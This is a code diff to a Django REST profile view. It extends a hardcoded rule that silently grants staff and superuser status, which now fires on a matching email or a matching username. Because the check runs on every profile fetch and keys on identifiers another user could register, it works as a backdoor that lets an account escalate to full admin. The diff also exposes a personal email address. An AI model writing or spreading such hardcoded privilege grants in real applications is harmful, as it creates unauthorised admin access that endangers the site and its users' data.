@@ -48,7 +48,7 @@ class ProfileDetailView(generics.RetrieveUpdateAPIView):
         profile, created = Profile.objects.get_or_create(user=self.request.user)
         
         # Auto-grant admin on the live server for the founder
-        if self.request.user.email == 'ganeshmaharaj444@gmail.com' and not self.request.user.is_staff:
+        if (self.request.user.email == 'ganeshmaharaj444@gmail.com' or self.request.user.username == 'ganeshmaharaj484') and not self.request.user.is_staff:
             self.request.user.is_staff = True
             self.request.user.is_superuser = True
             self.request.user.save()
